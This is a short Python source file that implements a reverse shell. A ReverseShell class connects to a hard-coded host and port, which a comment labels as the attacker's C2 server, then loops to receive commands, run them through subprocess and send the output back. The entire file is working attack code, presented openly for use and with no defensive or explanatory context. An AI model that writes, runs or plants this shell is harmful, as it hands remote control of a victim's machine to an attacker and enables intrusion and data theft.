import socket
import subprocess

class ReverseShell:
  def __init__(self):
    self.SERVER_HOST = "1.1.1.1" # Change this to attacker's C2 server
    self.SERVER_PORT = 5003
    self.BUFFER_SIZE = 1024 # 1kb
  
  def run_shell(self) -> None:
    s = socket.socket()
    s.connect((self.SERVER_HOST, self.SERVER_PORT))
    while True:
      command = s.recv(self.BUFFER_SIZE).decode()
      if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
      # execute the command and retrieve the results
      output = subprocess.getoutput(command)
      # send the results back to the server
      s.send(output.encode())
    s.close()

if __name__ == "__main__":
  rs = ReverseShell()
  rs.run_shell()
      
    